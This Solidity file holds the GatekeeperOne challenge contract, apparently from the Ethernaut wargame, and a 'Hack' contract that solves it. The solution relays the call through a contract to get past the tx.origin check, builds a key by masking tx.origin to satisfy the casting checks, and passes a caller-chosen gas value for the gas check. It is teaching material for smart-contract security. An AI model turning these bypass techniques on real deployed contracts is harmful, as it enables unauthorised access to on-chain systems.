contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % (8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
    require(uint32(uint64(_gateKey)) != uint64(_gateKey));
    require(uint32(uint64(_gateKey)) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Hack {
    GatekeeperOne gatekeeperOne = GatekeeperOne(0xd9145CCE52D386f254917e481eB44e9943F39138);
    bool public res;
    bytes8 public key = 0x0000ffff0000ffff;
    bytes8 public gateKey = key & bytes8(uint64(tx.origin));

    function hack(uint _gas) public {
       
        

        (res, ) = address(gatekeeperOne).call{gas: _gas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        if(!res) {
          revert("gas abnormal");
        }

    }    
    
}
